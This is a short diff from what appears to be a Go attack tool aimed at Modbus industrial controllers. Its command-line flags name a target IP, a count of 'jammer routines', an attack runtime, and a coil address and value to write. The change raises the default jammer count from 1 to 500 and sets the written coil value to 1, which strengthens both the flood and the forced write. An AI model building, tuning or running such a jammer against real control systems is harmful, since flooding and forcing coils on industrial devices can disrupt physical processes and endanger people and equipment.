@@ -21,10 +21,10 @@ var (
 
 func init() {
 	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "Enter IP address to target")
-	flag.IntVar(&jamming, "jamming", 1, "Number of times the jammer routines created") //More jammer routines = stronger jamming potential
+	flag.IntVar(&jamming, "jamming", 500, "Number of times the jammer routines created") //More jammer routines = stronger jamming potential
 	flag.IntVar(&runtime, "runtime", 1, "How long the attack will run")
 	flag.IntVar(&coil, "coil", 0, "The coil position you are writing to")
-	flag.IntVar(&coil_val, "coil_val", 0, "The value you are writing to the coil")
+	flag.IntVar(&coil_val, "coil_val", 1, "The value you are writing to the coil")
 }
 
 func jammer(target modbus.Client, coil uint16, coil_value int) {
